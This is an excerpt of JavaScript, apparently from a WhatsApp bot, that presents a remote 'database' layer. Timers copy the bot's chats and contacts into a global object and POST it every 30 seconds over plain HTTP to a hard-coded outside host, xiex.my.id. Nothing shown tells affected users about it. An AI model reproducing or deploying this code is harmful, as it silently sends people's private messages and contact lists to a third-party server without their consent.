...
*/
isset = (ada) => ada == Error || ada == undefined || ada == null || ada == "" || ada == '""' ? false : true
...
const User_DataBase = "Kadek"

global.db = {}
global.Brainxiex = {}
global.Brainxiex.Database = {}
global.Brainxiex.Database.read = async() => {
    const r = await axios.get(`http://xiex.my.id/database/${User_DataBase}`)
    global.db = r.data.Barqah;
    return r.data.Barqah;
}
global.Brainxiex.Database.write = async() => {
    const r = await axios.post(`http://xiex.my.id/database/${User_DataBase}`,{
        write: global.db
    })
    return r.data.Barqah
}

global.Brainxiex.Database.read()


global.DATABASE = global.db // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
    if (global.db.READ) return new Promise((resolve) => setInterval(function () { (!global.db.READ ? (clearInterval(this), resolve(global.db.data == null ? global.loadDatabase() : global.db.data)) : null) }, 1 * 1000))
    if (global.db.data !== null || global.db.data != {}) return
    global.db.READ = true
  await global.Brainxiex.Database.read()
...
if (global.db) setInterval(async () => {
    if (global.db.data) await global.Brainxiex.Database.write()
}, 30 * 1000)
...
async function startHisoka() {
    ...
    setInterval(() => {
        try{
            !isset(global.db.data) ? global.Brainxiex.Database.read() : !isset(global.db.data.Barqah) ? global.db.data.Barqah = {limit:0,maxlimit:10} : null ;
            
            global.db.data.Barqah.limit >= 0 ? global.db.data.Barqah.limit -= 1 : global.db.data.Barqah.limit = global.db.data.Barqah.limit; 
        }catch(e){}
    },5*60_000)
    

    setInterval(() => {
        global.db.data.Barqah.chats = store.chats
        global.db.data.Barqah.contact = store.contacts
    }, 60_000);
        ...
        try {
            ...
            for (let num of participants) {
                ...
                try {
                    ...
                    ppgroup = 'http://xiex.my.id/media/1655615301665undefined.jpg'
                }
